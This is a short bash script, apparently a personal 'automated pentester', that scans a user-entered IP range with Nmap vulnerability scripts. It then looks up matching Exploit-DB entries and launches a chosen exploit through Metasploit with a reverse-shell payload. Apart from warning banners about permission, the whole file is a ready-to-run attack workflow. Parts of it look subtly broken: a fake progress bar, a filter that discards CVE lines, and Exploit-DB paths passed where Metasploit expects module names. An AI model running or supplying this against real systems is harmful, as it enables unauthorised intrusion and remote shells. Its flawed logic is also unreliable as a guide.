#!/bin/bash

# =========================================================
# OMAP - Outstanding Multi-purpose Automated Pentester v2
# by StGlz
# contact: natone@riseup.net
# visit my ws: https://www.stglz-ecke.digital
# =========================================================
# WARNING: This script now includes exploit suggestions
# from Exploit-DB and automates testing with Metasploit.
# Use it ONLY on networks you own or have explicit
# permission to test. Seriously, don't be that person.
# =========================================================

# Terminal colors for style
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
BLUE=$(tput setaf 4)
CYAN=$(tput setaf 6)
BOLD=$(tput bold)
RESET=$(tput sgr0)

# Function for loading animation
function loading_animation() {
    local message="$1"
    echo -ne "${CYAN}${BOLD}${message}${RESET}"
    for i in {1..3}; do
        echo -ne "."
        sleep 0.5
    done
    echo ""
}

# Function for fake progress bar
function fake_progress() {
    local message="$1"
    echo -e "${BLUE}${BOLD}${message}${RESET}"
    for i in $(seq 1 50); do
        echo -ne "${GREEN}#${RESET}"
        sleep 0.05
    done
    echo -e " ${CYAN}[DONE]${RESET}"
}

# Check for dependencies (Nmap, searchsploit, and Metasploit)
function check_dependencies() {
    echo -e "${CYAN}Checking for required tools...${RESET}"
    for tool in nmap searchsploit msfconsole; do
        if ! command -v "$tool" &> /dev/null; then
            echo -e "${RED}Error: ${tool} is not installed.${RESET}"
            exit 1
        fi
    done
    echo -e "${GREEN}All tools are installed.${RESET}"
}

# Function to find exploits with searchsploit
function find_exploits() {
    local vuln="$1"
    echo -e "${CYAN}Searching for exploits related to: ${vuln}${RESET}"
    searchsploit "$vuln" | grep -vE '(cve|java|python)' # Filter noise
}

# Function to run Metasploit Framework with selected exploit
function run_metasploit() {
    local exploit="$1"
    local rhost="$2"
    echo -e "${CYAN}Running Metasploit with exploit: ${exploit}${RESET}"
    msfconsole -q -x "use ${exploit}; set RHOSTS ${rhost}; set PAYLOAD generic/shell_reverse_tcp; exploit"
}

# Main function
function main() {
    clear
    echo -e "${CYAN}${BOLD}=== OMAP v2 - Automated Pentesting with Exploits ===${RESET}"
    echo -e "${GREEN}Let's find vulnerabilities, exploit them, and test responsibly.${RESET}"
    echo -e "${RED}ONLY use this tool on networks you have permission to test.${RESET}\n"

    # Ask for target
    echo -ne "${CYAN}Enter the target IP or range (e.g., 192.168.1.0/24): ${RESET}"
    read TARGET

    if [ -z "$TARGET" ]; then
        echo -e "${RED}Error: No target provided. Exiting...${RESET}"
        exit 1
    fi

    # Start scanning
    loading_animation "Starting vulnerability scan with Nmap"
    fake_progress "Scanning for vulnerabilities"
    nmap --script vuln "$TARGET" -oN scan_results.txt

    # Display results
    echo -e "${GREEN}Scan completed. Here are the detected vulnerabilities:${RESET}"
    grep "|_" scan_results.txt | cut -d '|' -f 2 > vulns.txt
    cat vulns.txt

    # Exploit phase
    echo -e "\n${CYAN}Analyzing vulnerabilities and searching for exploits...${RESET}"
    while read -r vuln; do
        echo -e "\n${BOLD}Potential exploits for: ${vuln}${RESET}"
        find_exploits "$vuln"
    done < vulns.txt

    # Ask user to choose an exploit
    echo -ne "${CYAN}\nSelect an exploit from Exploit-DB (type path or quit): ${RESET}"
    read EXPLOIT

    if [ "$EXPLOIT" == "quit" ]; then
        echo -e "${CYAN}Exiting. Stay safe!${RESET}"
        exit 0
    fi

    # Run Metasploit with the selected exploit
    run_metasploit "$EXPLOIT" "$TARGET"
}

# Check dependencies and run the main function
check_dependencies
main
